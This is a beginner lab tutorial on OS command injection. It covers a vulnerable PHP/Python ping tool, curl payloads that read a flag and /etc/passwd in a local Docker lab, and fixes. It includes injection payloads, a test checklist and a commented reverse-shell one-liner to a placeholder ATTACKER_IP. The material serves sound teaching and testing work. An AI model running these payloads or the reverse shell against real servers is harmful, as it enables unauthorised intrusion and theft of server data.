# Command Injection

> **Difficulty:** Easy — **Level:** beginner

## Introduction

Apps sometimes need to **call OS commands** (ping, find files, convert images...). Command Injection happens when user input is **concatenated into a shell command** without validation. Attackers can inject their own commands using special chars like `;`, `&&`, `|`, backticks `` ` ``, `$()`. The impact is severe — the attacker runs commands **with the server's privileges**. It falls under **A03 Injection**.

---

## Part A — Understand

### How the shell splits commands

The shell parses a string. Special characters split it into multiple commands:

| Char | Meaning | Example |
|------|---------|---------|
| `;` | Run next command regardless | `whoami; id` |
| `&&` | Run next **only if** previous succeeded | `ls && whoami` |
| `\|` | Pipe: feed first output into next | `cat x \| grep secret` |
| `` ` `` | Command substitution | `` echo `id` `` |
| `$()` | Command substitution (modern) | `echo $(id)` |
| `\n` | Newline = new command | `whoami\ncat /flag` |

> **Intuition:** App does `ping 8.8.8.8`. You type `8.8.8.8; cat /etc/passwd` as the IP. The shell sees `;` → also runs `cat /etc/passwd`. That's how you "inject a command" into the running command.

### How the app gets vulnerable

```php
// VULNERABLE: input concatenated straight into a shell command
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

Or Python:

```python
# VULNERABLE
ip = request.args.get("ip")
os.system(f"ping -c 1 {ip}")
```

Using `subprocess` with an **argument list** (no shell) is safe instead of `os.system`.

---

## Part B — Exploit: Command Injection Lab

### Step 1: Start the lab

```bash
cd command-injection/lab
docker compose up -d
# Lab at: http://localhost:7107
```

The lab is a web ping tool: type an IP → the server runs `ping -c 1 <ip>` and shows the result.

<!-- IMG: Web ping lab page, normal IP input (step 1). File: command-injection_01_ping_page.png -->

### Step 2: Run a normal command

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.025 ms
...
```

<!-- IMG: ping 127.0.0.1 returning a normal result (step 2). File: command-injection_02_normal_ping.png -->

### Step 3: Detect the flaw with `;`

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;id"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<!-- IMG: ;id payload printing the id command output (step 3). File: command-injection_03_semicolon_id.png -->

> **Explain:** The executed command becomes `ping -c 1 127.0.0.1;id`. After ping, the shell runs `id`. Output `uid=33(www-data)` means the command runs **as the web server user** — remember this.

### Step 4: Read the flag file

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/flag.txt"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
FLAG{cmd_1nj3ct10n_2026}
```

<!-- IMG: cat /flag.txt succeeds (step 4). File: command-injection_04_cat_flag.png -->

> **Explain:** `/flag.txt` lives at the container root. `cat /flag.txt` prints it. `%20` is the URL-encoded space.

### Step 5: Alternative techniques

```bash
# && (only runs if ping succeeds)
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"

# | (pipe) — no need to wait for ping
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%7Ccat%20/flag.txt"

# Command substitution — nest a command inside the string
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
```

<!-- IMG: && , | , $() payloads all reading the flag (step 5). File: command-injection_05_variants.png -->

### Step 6: Read more sensitive files with curl

```bash
# Read /etc/passwd
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/etc/passwd"

# List the directory
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;ls%20-la%20/"

# Reverse shell (if nc exists): bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

<!-- IMG: Reading /etc/passwd and ls / via command injection (step 6). File: command-injection_06_further.png -->

> **Explain:** With command injection you can read any file the server can, scan the internal network, or set up a **reverse shell** to control the server. That's why this flaw is among the most dangerous.

---

## Part C — Defend

### Fixes

1. **Avoid calling the shell** — use programming APIs (e.g. PHP `gethostbyname`, or a ping library):

```php
// Do NOT use system(); use a purpose-built function
$result = gethostbyname($ip);
```

2. **If you must call a command, use a non-shell function with an argument list** (Python):

```python
import subprocess
subprocess.run(["ping", "-c", "1", ip], capture_output=True, text=True)  # safe
```

3. **Whitelist input**: only allow valid IP characters (`0-9 . :`).
4. **Never concatenate input into a command string.** Run as a low-privilege user.

### Quick test checklist

```text
[ ] payload: ;id  /  ;whoami  → is command output printed?
[ ] payload: &&id  → runs when the previous command succeeds?
[ ] payload: |id  → pipe?
[ ] payload: `id`  or  $(id)  → command substitution?
[ ] payload: \nid  → newline?
[ ] payload: ;sleep 5  → slow response (blind)?
[ ] Read file: ;cat /etc/passwd
```

---

---
